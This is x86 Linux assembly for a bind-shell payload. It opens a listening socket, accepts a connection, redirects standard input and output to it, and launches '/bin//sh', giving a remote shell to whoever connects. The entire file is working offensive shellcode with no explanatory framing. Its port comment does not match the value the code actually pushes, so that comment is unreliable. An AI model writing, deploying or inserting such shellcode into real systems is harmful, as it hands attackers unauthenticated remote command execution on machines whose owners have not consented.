global _start

section .text
_start:
    xor eax,eax
    xor ebx,ebx
    xor ecx,ecx
    xor edx,edx

    mov ax,0x167
    mov bl,0x2
    mov cl,0x1

    int 0x80
    mov edi,eax

    xor eax,eax
    mov ax,0x169
    mov ebx,edi
    xor ecx,ecx
    push ecx
    push ecx
    push word 0x5555 ; port 5555 => 0x15b3 =(little endian)> 0xb315
    push word 0x02

    mov ecx,esp
    mov dl, 16
    int 0x80

    xor eax,eax
    mov ax,0x16b ; syscal=listen()
    mov ebx,edi
    xor ecx,ecx
    int 0x80

    xor eax,eax
    mov ax,0x16c ; syscall=accept()
    mov ebx,edi
    xor ecx,ecx
    xor edx,edx
    xor esi,esi
    int 0x80


    xor edi,edi
    mov edi,eax

    mov cl,0x3 
    loop_dup2:
    xor eax,eax
    mov al,0x3f
    mov ebx,edi
    dec cl
    int 0x80

    jnz loop_dup2

    xor eax,eax
    push 0x68732f6e
    push 0x69622f2f
    mov ebx,esp
    push eax
    mov edx,esp
    push ebx
    mov ecx,esp
    mov al,0x0b
    int 0x80

    

